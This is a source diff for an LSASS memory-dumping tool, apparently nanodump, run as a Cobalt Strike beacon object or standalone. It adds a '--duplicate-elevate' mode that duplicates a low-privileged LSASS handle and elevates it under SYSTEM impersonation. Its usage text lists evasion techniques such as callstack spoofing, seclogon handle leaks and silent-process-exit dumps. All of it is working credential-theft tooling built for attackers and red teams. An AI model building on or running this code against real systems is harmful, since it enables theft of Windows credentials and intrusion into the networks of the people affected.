@@ -19,6 +19,7 @@ void go(char* args, int length)
     BOOL           snapshot_lsass;
     BOOL           duplicate_handle;
     BOOL           elevate_handle;
+    BOOL           duplicate_elevate;
     BOOL           use_valid_sig;
     BOOL           success = FALSE;
     BOOL           ret_val = FALSE;
@@ -58,6 +59,7 @@ void go(char* args, int length)
     snapshot_lsass = (BOOL)BeaconDataInt(&parser);
     duplicate_handle = (BOOL)BeaconDataInt(&parser);
     elevate_handle = (BOOL)BeaconDataInt(&parser);
+    duplicate_elevate = (BOOL)BeaconDataInt(&parser);
     get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
     use_seclogon_leak_local = (BOOL)BeaconDataInt(&parser);
     use_seclogon_leak_remote = (BOOL)BeaconDataInt(&parser);
@@ -111,7 +113,7 @@ void go(char* args, int length)
             goto cleanup;
     }
 
-    if (elevate_handle)
+    if (elevate_handle || duplicate_elevate)
     {
         success = is_current_user_system(&running_as_system);
         if (!success)
@@ -119,7 +121,7 @@ void go(char* args, int length)
 
         if (!running_as_system)
         {
-            DPRINT("The option --elevate-handle requires SYSTEM, impersonating...");
+            DPRINT("The options --elevate-handle and --duplicate-elevate require SYSTEM, impersonating...");
             success = impersonate_system(&hImpersonate);
             if (!success)
                 goto cleanup;
@@ -132,6 +134,7 @@ void go(char* args, int length)
         lsass_pid,
         duplicate_handle,
         elevate_handle,
+        duplicate_elevate,
         use_seclogon_duplicate,
         spoof_callstack,
         FALSE,
@@ -260,7 +263,7 @@ cleanup:
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
+    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -268,7 +271,9 @@ void usage(char* procname)
     PRINT("            create a dump with a valid signature");
     PRINT("Obtain an LSASS handle via:");
     PRINT("    --duplicate, -d");
-    PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("            duplicate a high privileged existing " LSASS " handle");
+    PRINT("    --duplicate-elevate, -de");
+    PRINT("            duplicate a low privileged existing " LSASS " handle and then elevate it");
     PRINT("    --seclogon-leak-local, -sll");
     PRINT("            leak an " LSASS " handle into nanodump via seclogon");
     PRINT("    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH");
@@ -309,6 +314,7 @@ int main(int argc, char* argv[])
     BOOL           snapshot_lsass                 = FALSE;
     BOOL           duplicate_handle               = FALSE;
     BOOL           elevate_handle                 = FALSE;
+    BOOL           duplicate_elevate              = FALSE;
     LPCSTR         silent_process_exit            = NULL;
     LPCSTR         dump_path                      = NULL;
     BOOL           success                        = FALSE;
@@ -410,19 +416,11 @@ int main(int argc, char* argv[])
                  !strncmp(argv[i], "--elevate-handle", 17))
         {
             elevate_handle = TRUE;
-
-            success = is_current_user_system(&running_as_system);
-            if (!success)
-                goto cleanup;
-
-            if (!running_as_system)
-            {
-                DPRINT("The option --elevate-handle requires SYSTEM, impersonating...");
-                success = impersonate_system(&hImpersonate);
-                if (!success)
-                    goto cleanup;
-                DPRINT("Impersonating SYSTEM")
-            }
+        }
+        else if (!strncmp(argv[i], "-de", 4) ||
+                 !strncmp(argv[i], "--duplicate-elevate", 20))
+        {
+            duplicate_elevate = TRUE;
         }
         else if (!strncmp(argv[i], "-sll", 5) ||
                  !strncmp(argv[i], "--seclogon-leak-local", 22))
@@ -562,7 +560,7 @@ int main(int argc, char* argv[])
     }
 
     if (get_pid_and_leave &&
-        (use_valid_sig || snapshot_lsass || fork_lsass || elevate_handle ||
+        (use_valid_sig || snapshot_lsass || fork_lsass || elevate_handle || duplicate_elevate ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
          use_seclogon_leak_remote || duplicate_handle || silent_process_exit))
     {
@@ -573,7 +571,7 @@ int main(int argc, char* argv[])
     if (silent_process_exit &&
         (use_valid_sig || snapshot_lsass || fork_lsass ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
-         use_seclogon_leak_remote || duplicate_handle || elevate_handle))
+         use_seclogon_leak_remote || duplicate_handle || elevate_handle || duplicate_elevate))
     {
         PRINT("The parameter --silent-process-exit is used alone");
         return 0;
@@ -582,6 +580,18 @@ int main(int argc, char* argv[])
     if (fork_lsass && snapshot_lsass)
     {
         PRINT("The options --fork and --snapshot cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_handle && elevate_handle)
+    {
+        PRINT("The options --duplicate and --elevate-handle cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_elevate && spoof_callstack)
+    {
+        PRINT("The options --duplicate-elevate and --spoof-callstack cannot be used together");
         return 0;
     }
 
@@ -597,6 +607,24 @@ int main(int argc, char* argv[])
         return 0;
     }
 
+    if (elevate_handle && duplicate_elevate)
+    {
+        PRINT("The options --elevate-handle and --duplicate-elevate cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_elevate && duplicate_handle)
+    {
+        PRINT("The options --duplicate-elevate and --duplicate cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_elevate && use_seclogon_duplicate)
+    {
+        PRINT("The options --duplicate-elevate and --seclogon-duplicate cannot be used together");
+        return 0;
+    }
+
     if (elevate_handle && use_seclogon_duplicate)
     {
         PRINT("The options --elevate-handle and --seclogon-duplicate cannot be used together");
@@ -606,6 +634,12 @@ int main(int argc, char* argv[])
     if (duplicate_handle && use_seclogon_leak_local)
     {
         PRINT("The options --duplicate and --seclogon-leak-local cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_elevate && use_seclogon_leak_local)
+    {
+        PRINT("The options --duplicate-elevate and --seclogon-leak-local cannot be used together");
         return 0;
     }
 
@@ -623,7 +657,13 @@ int main(int argc, char* argv[])
 
     if (elevate_handle && use_seclogon_leak_remote)
     {
-        PRINT("The options --duplicate-ñpcañ and --seclogon-leak-remote cannot be used together");
+        PRINT("The options --elevate-handle and --seclogon-leak-remote cannot be used together");
+        return 0;
+    }
+
+    if (duplicate_elevate && use_seclogon_leak_remote)
+    {
+        PRINT("The options --duplicate-elevate and --seclogon-leak-remote cannot be used together");
         return 0;
     }
 
@@ -713,6 +753,22 @@ int main(int argc, char* argv[])
         goto cleanup;
     }
 
+    if (elevate_handle || duplicate_elevate)
+    {
+        success = is_current_user_system(&running_as_system);
+        if (!success)
+            goto cleanup;
+
+        if (!running_as_system)
+        {
+            DPRINT("The options --elevate-handle and --duplicate-elevate require SYSTEM, impersonating...");
+            success = impersonate_system(&hImpersonate);
+            if (!success)
+                goto cleanup;
+            DPRINT("Impersonating SYSTEM")
+        }
+    }
+
     if (silent_process_exit)
     {
         // let the Windows Error Reporting process make the dump for us
@@ -734,6 +790,7 @@ int main(int argc, char* argv[])
         lsass_pid,
         duplicate_handle,
         elevate_handle,
+        duplicate_elevate,
         use_seclogon_duplicate,
         spoof_callstack,
         is_seclogon_leak_local_stage_2,
@@ -1103,6 +1160,7 @@ BOOL NanoDumpPPL(VOID)
         &hProcess,
         lsass_pid,
         duplicate_handle,
+        FALSE,
         FALSE,
         FALSE,
         FALSE,
